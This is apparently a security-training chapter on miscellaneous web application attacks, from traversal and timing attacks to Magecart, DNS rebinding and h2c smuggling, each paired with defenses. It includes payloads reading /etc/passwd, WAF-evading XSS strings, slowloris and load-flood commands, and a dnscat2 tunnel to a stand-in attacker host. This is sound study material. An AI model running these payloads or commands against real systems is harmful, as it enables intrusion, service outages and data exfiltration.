# 08 — Other Web Application Attacks

> Everything from the 35-item catalog ([see 02](./02-owasp-top-10-and-web-threats.md#the-full-ceh-web-application-attack-catalog-35-named-attacks)) that didn't get a dedicated file — path/data attacks, business-logic abuse, supply-chain-style attacks, and network/protocol-level attacks against the infrastructure hosting the app.

## Table of Contents
- [Directory Traversal](#directory-traversal)
- [Hidden Field Manipulation](#hidden-field-manipulation)
- [Insecure Deserialization](#insecure-deserialization)
- [Buffer Overflow](#buffer-overflow)
- [Business Logic Bypass Attack](#business-logic-bypass-attack)
- [CAPTCHA Attacks](#captcha-attacks)
- [Platform Exploits](#platform-exploits)
- [Web-Based Timing Attacks](#web-based-timing-attacks)
- [Obfuscation Application](#obfuscation-application)
- [Unvalidated Redirects and Forwards](#unvalidated-redirects-and-forwards)
- [Magecart Attack](#magecart-attack)
- [Watering Hole Attack](#watering-hole-attack)
- [MarioNet Attack](#marionet-attack)
- [Denial-of-Service (DoS)](#denial-of-service-dos)
- [DNS Rebinding Attack](#dns-rebinding-attack)
- [H2C Smuggling Attack](#h2c-smuggling-attack)
- [Network Access Attacks](#network-access-attacks)
- [DMZ Protocol Attacks](#dmz-protocol-attacks)

---

## Directory Traversal

**Root cause:** insufficient sanitization of a file-path parameter lets `../` (or encoded equivalents) escape the intended directory and reach arbitrary files on the filesystem.

```
GET /getfile?name=../../../../etc/passwd
GET /getfile?name=..%2f..%2f..%2f..%2fetc%2fpasswd            # URL-encoded
GET /getfile?name=....//....//....//....//etc/passwd            # bypasses naive "../"-only stripping
GET /getfile?name=..\..\..\..\windows\win.ini                   # Windows path separator variant
```
**Defenses:** resolve the requested path to a canonical absolute path and verify it still falls within the intended base directory before opening the file; prefer serving files by an opaque ID mapped server-side rather than a raw filename at all.

## Hidden Field Manipulation

**Root cause:** the application places business-logic-relevant values (price, discount code, user role) into a hidden HTML form field, trusting the client not to change what it can't *see* — but hidden fields are fully editable client-side regardless of visibility.

```html
<!-- As served by the application -->
<input type="hidden" name="price" value="499.00">

<!-- Attacker edits via browser DevTools or an intercepting proxy before submission -->
<input type="hidden" name="price" value="4.99">
```
**Defenses:** never trust any client-supplied value for a security- or pricing-relevant decision — recompute/verify price, role, and permissions server-side from data the server itself controls (e.g., a product-ID lookup against the authoritative price list), regardless of what the client submits.

## Insecure Deserialization

Covered under [A08 — Software and Data Integrity Failures](./02-owasp-top-10-and-web-threats.md#a08-software-and-data-integrity-failures). Quick recap: deserializing attacker-controlled data using a format capable of instantiating arbitrary objects (Java `ObjectInputStream`, PHP `unserialize()`, Python `pickle.loads()`, .NET `BinaryFormatter`) can lead to logic tampering or full remote code execution via "gadget chains" — sequences of legitimate classes on the classpath whose side effects, when chained together during deserialization, add up to attacker-controlled behavior.

```php
// PHP — vulnerable pattern
$user_data = unserialize($_COOKIE['user_prefs']);   // never unserialize user-controlled input
```
**Defenses:** never deserialize untrusted data with a format capable of object instantiation; prefer JSON/data-only formats; if object deserialization is unavoidable, sign the serialized blob (HMAC) and verify before deserializing, and use deserialization allow-lists supported by the language/library (e.g., Java's `ObjectInputFilter`).

## Buffer Overflow

**Root cause:** a program writes more data into a fixed-size memory buffer than it was allocated to hold, overwriting adjacent memory — potentially including the return address on the stack, which an attacker can redirect to their own injected code.

While buffer overflows are more classically associated with native (C/C++) system-level exploitation than with typical high-level web application code, they remain highly relevant to web applications through:
- **Native extensions/modules** called from a web app's runtime (a C-based image-processing library, a legacy CGI binary, custom native code invoked via FFI).
- **The web server or app-server binary itself** (Apache, IIS, Nginx, PHP-FPM) — historically the source of several critical CVEs exploitable via crafted HTTP requests (long headers, malformed chunked encoding).
- **Embedded/legacy components** in the request-processing pipeline that don't do modern bounds checking.

```bash
# A simple length-based fuzzing probe to look for crash/error behavior
python3 -c "print('A' * 50000)" | curl -d @- https://target.com/legacy-upload-handler
```
**Defenses:** modern memory-safe languages avoid this class of bug entirely at the application layer; where native code must be used, apply bounds checking, use safe string-handling APIs, enable OS-level mitigations (ASLR, DEP/NX, stack canaries), and keep the web server/app-server binaries patched.

## Business Logic Bypass Attack

**Root cause:** the application's *intended* workflow is technically enforced only by the order the UI presents steps in — not by the server actually verifying that each step's preconditions were genuinely satisfied. An attacker who calls endpoints out of the expected sequence, or skips a step's client-side gate entirely, can reach an unintended state.

**Example:** an e-commerce checkout that applies a discount code, then calculates shipping, then charges the card — if the "apply discount" and "charge card" endpoints are independent API calls with no server-side state machine enforcing order, an attacker might replay the discount-application call multiple times, or call the "charge" endpoint directly with a manipulated total, skipping the price recalculation step entirely.

**Defenses:** enforce workflow state transitions server-side (a real state machine tied to the user's session/order record, not just UI sequencing), re-validate all business-critical values at the final step regardless of what happened earlier in the flow.

## CAPTCHA Attacks

**Root cause:** CAPTCHAs are meant to distinguish humans from bots, but implementation weaknesses let attackers defeat them programmatically.

Common bypass techniques:
- **OCR-based solving** — for weak, distorted-text CAPTCHAs, off-the-shelf OCR (or a small ML model) can solve a large fraction automatically.
- **CAPTCHA solver farms** — cheap human-solving services (accessed via API) that solve a CAPTCHA image/challenge for a small fee within seconds, defeating even strong visual CAPTCHAs at scale.
- **Reuse / replay** — if the same CAPTCHA solution token can be reused across multiple form submissions because the server doesn't invalidate it after first use.
- **Client-side-only validation** — if the "I am human" check is verified purely in JavaScript with the result posted alongside the form, an attacker can simply skip running the check and forge the expected success value.
- **Audio-challenge weaknesses** — accessibility audio alternatives are sometimes far easier to solve via speech-to-text than the visual challenge they accompany.

**Defenses:** invalidate CAPTCHA tokens after a single use, always verify server-side (never trust a client-reported "passed" flag), use modern risk-based challenges (reCAPTCHA v3-style invisible scoring) that combine CAPTCHA with behavioral/rate signals rather than relying on visual puzzles alone.

## Platform Exploits

**Root cause:** exploiting a known, publicly disclosed vulnerability in the underlying platform/framework/CMS the application is built on (WordPress, Drupal, Joomla, a specific version of a JS framework's server-side rendering component), rather than a bug unique to the application's own custom code.

```bash
# Fingerprint the CMS/platform and version first (see 03 — Footprinting)
whatweb https://target.com

# Then check for known CVEs matching that exact version
searchsploit wordpress 6.4.2
searchsploit drupal 9
```
**Defenses:** this is squarely a [Vulnerable and Outdated Components (A06)](./02-owasp-top-10-and-web-threats.md#a06-vulnerable-and-outdated-components) problem — timely patching, removing unused plugins/modules, and subscribing to the platform vendor's security advisories are the core mitigations.

## Web-Based Timing Attacks

**Root cause:** measurable differences in how long an operation takes leak information about secret data or internal state, even when the actual response *content* looks identical.

**Direct timing attack (comparing a supplied value byte-by-byte against a secret using a naive `==` comparison):**
```javascript
// Vulnerable: a non-constant-time comparison returns as soon as it finds a mismatch,
// so a correct prefix takes measurably longer to reject than an incorrect first byte.
function checkToken(supplied, secret) {
  return supplied === secret;
}
```
An attacker measures response time across many guesses for each character position, inferring the secret one byte at a time faster than brute-forcing the entire keyspace at once.

**Cross-site timing attack:** measuring how long a *cross-origin* resource takes to load (via the `Resource Timing API` or simple `fetch` timing, without needing to read the response body directly, which the Same-Origin Policy would normally block) to infer state — e.g., whether a victim is logged into a particular service, based on how quickly a "redirect if not logged in" response returns versus a full authenticated page render.

**Video-parsing timing attack:** a more exotic variant where the time taken to process an uploaded media file (video/image) leaks information about the parsing code path taken internally, sometimes correlating with sensitive branch conditions in the handling logic.

**Defenses:** use constant-time comparison functions for any secret-comparing logic (`hmac.compare_digest` in Python, `crypto.timingSafeEqual` in Node.js), add artificial jitter/normalize response times for security-sensitive endpoints, and avoid exposing operation timing differences that correlate with secret data at all where possible.

## Obfuscation Application

**Root cause:** attackers obfuscate their payloads, traffic, or malicious files specifically to evade signature-based detection (WAFs, antivirus, IDS/IPS) — this "attack" is really a technique layered on top of the others in this repo, worth calling out because evasion is often the deciding factor in whether an otherwise well-known attack succeeds against a defended target.

```
# Examples of obfuscation applied to a basic XSS payload to evade a naive WAF signature
<scr\x00ipt>alert(1)</scr\x00ipt>
<img src=x onerror=&#0000097lert(1)>
javascript&#58;alert(1)
```
**Defenses:** normalize/decode input fully (recursively, to a stable fixed point) *before* applying any security filtering, rather than filtering on the raw, possibly-encoded input a single time.

## Unvalidated Redirects and Forwards

**Root cause:** the application accepts a URL/target parameter and redirects/forwards the user to it without validating it against an allow-list, letting an attacker use the *trusted* domain as a stepping stone in a phishing chain.

```
https://target.com/redirect?url=https://evil-lookalike-login.com
```
Because the link visibly starts with the trusted `target.com` domain, victims are far more likely to click it — the redirect then silently forwards them to a convincing phishing clone.

**Types of redirection attacks:**
- **Header-based open redirect** — the `Location` response header is built from user input.
- **JavaScript open redirect** — client-side code (e.g., `window.location = getParam('next')`) performs the redirect instead of a server response header, sometimes evading server-side redirect-scanning tools entirely.

**Defenses:** avoid accepting a full external URL as a redirect target at all where possible (redirect to an internal route/ID instead); where an external redirect is genuinely required, validate the destination against a strict allow-list and show an explicit interstitial warning page before leaving the trusted domain.

## Magecart Attack

**Root cause:** a supply-chain attack in which a malicious script — injected into a checkout page, often via a compromised **third-party** script the site itself loads — silently skims payment card details as the victim types them, and exfiltrates them to an attacker-controlled server.

```
Step 1: Attacker compromises a third-party script (analytics tag, chat widget,
        ad script) commonly included on e-commerce checkout pages.
Step 2: The injected script scrapes card-number/CVV/expiry input fields on submit.
Step 3: Scraped data is exfiltrated, typically disguised as ordinary-looking
        analytics/telemetry traffic to blend in.
Step 4: The attacker monetizes the harvested card data.
```
This directly illustrates the [Third-Party Components risk (Layer 6) in the vulnerability stack](./01-web-application-concepts.md#the-vulnerability-stack) — the merchant's own code can be flawless while a single compromised script tag still leads to a full payment-data breach.

**Defenses:** Subresource Integrity (SRI) hashes on every third-party script tag, a strict Content-Security-Policy limiting which origins can load scripts on checkout pages, isolating the payment-entry iframe from third-party scripts entirely (e.g., hosted payment fields from a PCI-compliant processor), and regular third-party script inventory audits.

## Watering Hole Attack

**Root cause:** rather than attacking the actual target directly, the attacker compromises a *third-party website the target's users are known to visit* (an industry forum, a vendor's support portal, a niche community site), and plants malware/exploits there — waiting for members of the intended target audience to visit and get compromised as a side effect of normal browsing.

```
Step 1: Attacker profiles the target organization's employees to identify frequently-visited third-party websites.
Step 2: Attacker compromises one or more of those third-party sites (or purchases a
        malicious ad placement on them).
Step 3: The compromised site serves malware/exploits only to visitors matching the
        target profile (filtered by IP range, User-Agent, or referrer).
Step 4: Employees visiting during their normal routine become infected without any
        direct interaction with the actual target organization's infrastructure.
```
**Defenses:** this is largely a *client-side* endpoint-security and network-egress-filtering problem rather than something the target's own web application can directly control — browser isolation, up-to-date endpoint protection, and network-level threat-intelligence blocklists are the primary mitigations.

## MarioNet Attack

**Root cause:** abuses the **Service Worker** API (a background script a page can register to keep running independently of the page itself, originally designed to enable offline-capable web apps) to keep executing attacker code even *after the user closes the browser tab* that registered it — effectively turning the victim's browser into a persistent, silent participant in the attacker's infrastructure (e.g., a distributed scraping/click-fraud/DDoS botnet), all without needing any traditional malware installation.

```javascript
// Simplified illustration of the registration step a malicious page would perform
navigator.serviceWorker.register('/sw.js').then(function(registration) {
  // the registered worker can continue running in the background,
  // periodically waking up to perform attacker-directed tasks,
  // constrained only by the browser's own Service Worker lifecycle rules
});
```
**Defenses:** browser-level Service Worker permission prompts and scope restrictions (a Service Worker can only control pages under its own registration scope), and security-conscious users/organizations disabling Service Workers for untrusted origins via browser policy where feasible.

## Denial-of-Service (DoS)

**Root cause:** exhausting a target's resources (CPU, memory, bandwidth, database connections, application-level rate limits) so legitimate users can no longer get service. See the companion **Module 10: Denial-of-Service** repository for the full network/protocol-level DoS/DDoS technique catalog (SYN floods, amplification attacks, botnets); this file focuses on **application-layer** DoS specific to web apps.

```bash
# Application-layer "Slowloris"-style attack — holds many connections open with
# slow, incomplete HTTP requests, exhausting the server's connection pool
slowloris target.com

# A resource-intensive endpoint hit at high concurrency (e.g., an expensive search/export
# feature) can achieve the same effect with far less bandwidth than a volumetric attack:
hey -n 100000 -c 500 "https://target.com/api/expensive-report?range=all"
```
**Defenses:** rate limiting per client/IP/account, request timeouts, connection limits, caching expensive query results, a WAF/CDN capable of absorbing volumetric traffic, and horizontal auto-scaling for legitimate traffic spikes.

## DNS Rebinding Attack

**Root cause:** exploits the gap between when a browser performs a same-origin security check (based on hostname) and when the actual network connection is made (based on the IP address the hostname currently resolves to) — by controlling a DNS record with a very short TTL, the attacker can change what an already-trusted hostname resolves to *after* the browser's security check has passed but *before* the connection is actually opened.

```
1. Victim's browser resolves attacker-owned-domain.com → 1.2.3.4 (attacker's server),
   loads a page from it, and this origin passes any initial checks.
2. Attacker's DNS record has a 0-second TTL. Almost immediately after,
   attacker-owned-domain.com now resolves to 127.0.0.1 (or an internal RFC1918 address).
3. The already-loaded page's JavaScript makes a follow-up request to
   "attacker-owned-domain.com" again — the browser re-resolves DNS, gets
   the new internal IP, and happily sends the request there because it's
   still the "same origin" as far as the Same-Origin Policy's hostname check
   is concerned.
4. The attacker's script can now read responses from an internal-only service
   that should never have been reachable from a public web page.
```
**Defenses:** validate the `Host` header against an allow-list on every internal service (don't rely solely on network topology for isolation), pin DNS resolutions for the duration of a page's lifetime where feasible, and enforce minimum TTLs / reject 0-TTL responses at the resolver level for security-sensitive contexts.

## H2C Smuggling Attack

**Root cause:** abuses the HTTP/2 cleartext (`h2c`) upgrade mechanism when a front-end proxy speaks HTTP/1.1 to the browser but forwards traffic to a backend over a connection that can be upgraded to h2c — an attacker crafts an `Upgrade: h2c` request that the front-end proxy passes through without fully understanding, letting the attacker "smuggle" additional, unauthorized requests directly to the backend over the now-upgraded connection, bypassing whatever request inspection/routing rules the front-end proxy was supposed to enforce.

```
GET / HTTP/1.1
Host: target.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: <base64-settings>

[attacker-controlled HTTP/2 frames follow, sent directly to the backend once
 the proxy passes the upgrade through unmodified]
```
**Defenses:** strip `Connection`, `Upgrade`, and `HTTP2-Settings` headers at the front-end proxy for any request it doesn't itself intend to upgrade, and ensure the reverse proxy explicitly disables/ignores client-initiated protocol upgrades it isn't designed to broker.

## Network Access Attacks

**Root cause:** attacking the network layer and services that support the web application rather than the application code itself — open management ports, weakly-secured administrative interfaces, or exposed internal services reachable due to inadequate network segmentation around the hosting environment.

```bash
# Discovering exposed management/administrative services around a web app's hosting
nmap -p 21,22,23,3306,3389,5432,6379,9200,27017 target.com

# Common exposed services worth checking for default/weak credentials in this context:
# FTP (21), SSH (22), Telnet (23), MySQL (3306), RDP (3389), PostgreSQL (5432),
# Redis (6379, often unauthenticated by default), Elasticsearch (9200), MongoDB (27017)
```
**Defenses:** strict network segmentation (the web tier should not be able to reach management ports on adjacent hosts unless explicitly required), a properly scoped firewall/security-group ruleset, and disabling/binding administrative services to `localhost` or a dedicated management VLAN only.

## DMZ Protocol Attacks

**Root cause:** exploiting protocols that are permitted to traverse the DMZ (the network segment sitting between the public internet and the internal network, hosting the public-facing web servers) more loosely than they should be — e.g., overly permissive ICMP, DNS, or NTP rules intended for legitimate operational needs, repurposed by an attacker for reconnaissance or covert data exfiltration (protocol tunneling) out of the DMZ.

```bash
# DNS tunneling is a classic DMZ-protocol-abuse technique for exfiltrating
# data even when direct outbound HTTP/HTTPS is otherwise tightly firewalled,
# since outbound DNS resolution is almost always permitted
# (illustrative command using a DNS-tunneling tool such as iodine or dnscat2)
dnscat2 --dns server=attacker-ns.evil-domain.com
```
**Defenses:** apply the same rigor to "operational" protocols crossing the DMZ boundary as to HTTP/HTTPS — restrict ICMP types, use split-horizon/forwarding-only internal DNS resolvers rather than allowing arbitrary external DNS lookups from DMZ hosts, and monitor DMZ egress traffic for anomalous volume or protocol usage.

---

**Previous:** [← 07 — Web Services, API & Webhook Attacks](./07-web-services-api-and-webhook-attacks.md) · **Next:** [09 — Web Application Hacking Tools →](./09-web-app-hacking-tools.md)
